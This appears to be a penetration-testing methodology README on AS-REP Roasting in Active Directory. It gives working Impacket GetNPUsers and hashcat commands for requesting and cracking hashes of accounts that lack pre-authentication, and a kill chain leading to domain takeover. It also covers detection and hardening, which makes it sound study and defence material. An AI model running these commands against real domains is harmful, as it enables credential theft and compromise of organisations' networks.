> **English** | [Italiano](README.md)

# AS-REP Roasting: offline theft for accounts without pre-authentication

> - **Phase:** Credential Access (Active Directory domain)
> - **Visibility:** Low-Medium - generates AS-REQ/AS-REP (Event ID 4768) for the target accounts; more discreet than Kerberoasting if targeted
> - **Prerequisites:** existence of accounts with "Do not require Kerberos preauthentication" enabled; to discover them you need a domain account (via LDAP) or a list of usernames (attack without credentials)
> - **Technique:** `AS-REP Roasting` | **Typical severity:** `High` | **Finding ID:** to assign in lab (methodology)

- Nature of the document: methodology. Illustrative outputs; example hashes truncated and non-crackable.
- Objective: obtain offline-crackable material for accounts with Kerberos pre-authentication disabled, without knowing their password.

---

## Executive Summary

AS-REP Roasting is the twin of Kerberoasting applied to the initial phase of the Kerberos flow. When an
account has pre-authentication disabled (flag `DONT_REQ_PREAUTH`), the KDC responds to an AS-REQ with an
AS-REP containing a portion encrypted with the key derived from the user's password, without first verifying
that the requester knows that password. Anyone, even without credentials, can therefore request the AS-REP of
a vulnerable account and attack its password offline.

Disabled pre-authentication is a misconfiguration, sometimes inherited from legacy applications or set for
convenience. Unlike Kerberoasting (which hits service accounts), AS-REP Roasting hits any user with that
flag, including normal users with weak passwords.

## Operational context (why, before how)

The cost is very low: if LDAP enumeration reveals accounts with `DONT_REQ_PREAUTH`, the attack is immediate
and offline. It can even work without credentials, if you have a list of usernames (e.g., from kerbrute user
enumeration), by trying which ones respond with a crackable AS-REP. The operational decision is to target
the accounts found instead of sweeping the entire domain, reducing the Event ID 4768 generated.

## Execution / Commands

### From Linux (Impacket GetNPUsers)

```bash
# With credentials: find and roast accounts without pre-auth
GetNPUsers.py corp.local/utente:'Password123' -dc-ip 10.10.10.10 -request -format hashcat -outputfile asrep.txt
```

```bash
# Without credentials: try a list of usernames (only those without pre-auth will respond)
GetNPUsers.py corp.local/ -dc-ip 10.10.10.10 -usersfile users.txt -format hashcat -no-pass
```

Illustrative output (truncated, non-crackable hash):

```
$krb5asrep$23$j.legacy@CORP.LOCAL:a1b2...[TRUNCATED]...9f   <-- etype 23: offline crackable
```

### Offline cracking

```bash
# Mode 18200 = Kerberos 5 AS-REP etype 23 (RC4)
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

## Analysis of results

A recovered password provides a valid domain account (foothold) or, if the account is privileged, a direct
jump. As with Kerberoasting, success depends on the password entropy: an account with pre-auth disabled but a
robust password produces an uncrackable hash. Real severity `High` if the password is recovered, otherwise
the finding is the misconfiguration alone (`Medium`: disabled pre-auth is a weakening even if the password
resists).

### Theoretical Analysis

The Kerberos flow (see [THEORETICAL-FOUNDATIONS](<../../THEORETICAL-FOUNDATIONS.en.md>), sec. 3.1) provides
pre-authentication precisely to prevent this attack: normally the client must send a timestamp encrypted with
its own key in the AS-REQ, proving it knows the password before the KDC issues the AS-REP. Disabling pre-auth
removes this proof and turns the AS-REP into an offline oracle on the password (violation of property P2). It
is the cleanest example of how a configuration "convenience" nullifies a countermeasure designed on purpose.

## Remediation (Blue Team)

**Detection.** Event ID 4768 for accounts with pre-auth disabled, especially in volume or with RC4 etype;
AS-REP requests from unexpected sources; honeypot accounts with the flag set as a decoy.

**Hardening.** Remove the `DONT_REQ_PREAUTH` flag wherever it is not strictly necessary (periodic LDAP
review); where it is unavoidable for compatibility, enforce long, random passwords and monitor; disable RC4
in favor of AES.

---

## Real-World Scenario: Post-Exploitation Projection

> Applies to the "password recovered" outcome (severity High).

### Attacker Perspective (Red Team)

**Starting point:** a list of accounts with pre-auth disabled (from LDAP or an attempt against a username
list).

**Immediate next step:** roast and offline cracking; with the password, access as the user.

**Projected Kill Chain:**

```
Account without pre-auth identified
        |
        v
AS-REP Roasting -> offline-crackable hash
        |
        v
Password recovered -> domain foothold (or privileged account)
        |
        v
BloodHound + escalation (ACL/delegation/ADCS) -> DCSync -> domain
```

**Potential impact:** from no or low credentials to a domain foothold, through a single misconfiguration
combined with a weak password.

**Typical monetization vectors:** as with the other AD chains (ransomware, exfiltration, access brokering)
downstream of escalation.

### Defender Perspective (Blue Team)

**Detection:** anomalous 4768 for accounts with pre-auth disabled; unexpected RC4 etype.

**Indicators of Compromise (IOC):** AS-REP requests for `DONT_REQ_PREAUTH` accounts from illegitimate hosts;
cracking followed by a login of the account.

**Containment:** reset the exposed account's password; remove the flag; investigate the accesses.

**Eradication and hardening:** periodic audit of the flag across the whole domain; robust passwords where the
flag is unavoidable; disabling of RC4.

**Defensive lesson:** pre-authentication exists to prevent exactly this. Disabling it "to make an app work"
reintroduces a weakness the protocol had already closed.

---

## Reference tools

| Tool | Type | Technique/Access | Main use case |
| :--- | :--- | :--- | :--- |
| `GetNPUsers.py` (Impacket) | Python toolkit | CLI - Active | Discovery and roasting of accounts without pre-auth from Linux |
| `Rubeus` | .NET tool | CLI - Active | AS-REP Roasting from a Windows host |
| `hashcat` | GPU cracker | CLI - Offline | Cracking of AS-REP hashes (mode 18200) |
| `ldapsearch` / `nxc` | Enum | CLI - Active | Identification of accounts with `DONT_REQ_PREAUTH` |

## Methodology notes

In a real lab document: which accounts have pre-auth disabled, the cracking outcome and its severity. Also
try the no-credential variant against a username list (it shows the attack does not presuppose a foothold).

## MITRE ATT&CK mapping

| Tactic | Technique | MITRE ID | Action Description |
| :--- | :--- | :--- | :--- |
| Credential Access | Steal or Forge Kerberos Tickets: AS-REP Roasting | `T1558.004` | AS-REP request for accounts without pre-auth and offline cracking. |
| Discovery | Account Discovery: Domain Account | `T1087.002` | Identification of accounts with pre-auth disabled. |
| Credential Access | Brute Force: Password Cracking | `T1110.002` | Offline cracking of the AS-REP hash. |

## Links to other modules

| Source | This technique | Effect |
| :--- | :--- | :--- |
| [domain-enumeration](<../../01-enumeration/domain-enumeration/README.en.md>) / [kerbrute](<../../01-enumeration/kerbrute-userenum/README.en.md>) | AS-REP Roasting | provide the target accounts or the username list |
| AS-REP Roasting | [hashcat](<../../../04-system-exploitation/05-password-cracking/hashcat/README.en.md>) | offline cracking with the tools already in the repo |
| AS-REP Roasting | [Kerberoasting](<../kerberoasting/README.en.md>) | twin technique: together they cover both ends of the Kerberos flow |

---

> **Note:** All described techniques are for educational and methodology-documentation purposes. Execution only in owned labs or with explicit authorization. Illustrative outputs, not from real systems.
